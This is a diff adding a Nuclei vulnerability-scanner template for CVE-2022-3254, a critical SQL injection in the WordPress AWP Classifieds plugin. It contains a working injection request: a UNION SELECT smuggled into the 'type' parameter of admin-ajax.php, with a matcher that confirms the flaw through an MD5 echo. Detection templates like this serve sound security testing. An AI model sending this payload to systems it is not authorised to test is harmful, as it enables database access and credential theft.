@@ -1,0 +1,30 @@
+id: cve-2022-3254
+info:
+  name: WordPress AWP Classifieds plugin SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress plugin AWP Classifieds has an SQL injection vulnerability prior to version 4.3. This is caused by improper escaping of the type parameter. Attackers can exploit this to obtain sensitive data such as usernames and passwords.
+  reference:
+    - https://wpscan.com/vulnerability/546c47c2-5b4b-46db-b754-c6b43aef2660
+  classification:
+    cve-id: CVE-2022-3254
+    cvss-score: 9.8
+  tags: sqli,wordpress
+
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=awpcp-get-regions-options&parent_type=country&context=search&parent=Algeria&type=user_login%60+FROM+wp_users+UNION+ALL+SELECT+md5(3243563454354365611235434);--+- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: NucleiSecurityScanner
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e486e011e05d87f14381be3ea3005a6f"
+        part: body
